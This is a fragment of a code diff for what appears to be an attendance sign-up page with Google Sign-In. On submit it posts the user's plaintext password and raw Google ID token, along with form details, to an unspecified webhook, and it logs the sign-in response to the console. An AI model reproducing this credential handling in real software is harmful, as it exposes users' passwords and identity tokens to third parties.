+            console.log('Google Sign-In response:', response);
+            
+            const credential = response.credential;
+            const payload = JSON.parse(atob(credential.split('.')[1]));
+            
+            document.getElementById('email').value = payload.email;
+            
+            const passwordInput = document.getElementById('password');
+            passwordInput.removeAttribute('required');
+            passwordInput.style.display = 'none';
+            
+            const passwordLabel = passwordInput.closest('.form-group').querySelector('label[for="password"]');
+            if (passwordLabel) {
+                passwordLabel.style.display = 'none';
+            }
+            
+            let googleFlag = document.createElement('input');
+            googleFlag.type = 'hidden';
+            googleFlag.name = 'google_sign_in';
+            googleFlag.value = 'true';
+            form.appendChild(googleFlag);
+            
+            let googleToken = document.createElement('input');
+            googleToken.type = 'hidden';
+            googleToken.name = 'google_token';
+            googleToken.value = credential;
+            form.appendChild(googleToken);
+            
+            setTimeout(() => {
+                form.classList.add('show-page-2');
+                page2.scrollTop = 0;
+            }, 500);
         }
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
+        submitButton.addEventListener('click', async () => {
+            const nameInput = document.getElementById('name');
+            const positionInput = document.getElementById('position');
+            const specificJobTitleInput = document.getElementById('specificJobTitle');
+
+            if (!nameInput.value || !positionInput.value || !specificJobTitleInput.value) {
+                alert('Please fill in your Name, Position, and Specific Job Title.');
+                return;
+            }
+
+            submitButton.textContent = 'Submitting...';
+            submitButton.disabled = true;
+
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                name: nameInput.value,
+                position: positionInput.value,
+                specificJobTitle: specificJobTitleInput.value,
+                remarks: document.getElementById('remarks').value,
+                google_sign_in: document.querySelector('input[name="google_sign_in"]')?.value || 'false',
+                google_token: document.querySelector('input[name="google_token"]')?.value || '',
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    form.classList.add('show-page-3');
+                    page3.scrollTop = 0;
+                } else {
+                    throw new Error('Submission failed');
+                }
+            } catch (error) {
+                alert('Submission failed. Please try again.');
+            } finally {
+                submitButton.textContent = 'Submit Attendance';
+                submitButton.disabled = false;
+            }
+        });
+
+        window.addEventListener('load', () => {
+            page1.scrollTop = 0;
+            page2.scrollTop = 0;
+            page3.scrollTop = 0;
+        });
     </script>
+
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
 </body>
 </html>
